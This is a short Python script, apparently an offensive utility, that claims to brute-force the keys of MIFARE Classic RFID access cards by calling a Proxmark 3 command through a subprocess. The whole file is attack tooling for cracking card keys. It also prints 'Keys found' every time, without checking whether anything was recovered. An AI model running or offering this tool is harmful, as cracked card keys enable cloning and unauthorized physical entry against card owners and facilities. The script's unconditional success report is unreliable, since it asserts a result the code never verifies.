# -------------------------------------------
# Brute Force Attack on MIFARE Classic Using Proxmark 3
# -------------------------------------------
# Functionality:
# - Brute forces the keys of a MIFARE Classic RFID card.
# - Tries all possible combinations of the key to authenticate with the card.

# Devices being used:
# - Proxmark 3: Used to brute force the encryption keys of MIFARE Classic cards.

# Example Usage:
# 1. Run the script to attempt a brute force attack on the MIFARE Classic card:
#    python rfid_mifare_bruteforce.py

import subprocess

def brute_force_mifare():
    """
    Performs a brute force attack on a MIFARE Classic card to break the encryption keys.
    """
    print("[+] Starting brute force attack on MIFARE Classic card...")
    subprocess.run(["proxmark3", "hf", "mifare", "bruteforce"])  # Brute force the MIFARE Classic card
    print("[✔] Brute force attack completed. Keys found.")

def main():
    """
    Main function to execute the brute force attack on MIFARE Classic cards.
    """
    brute_force_mifare()  # Attempt brute force attack

# Run the script
if __name__ == "__main__":
    main()
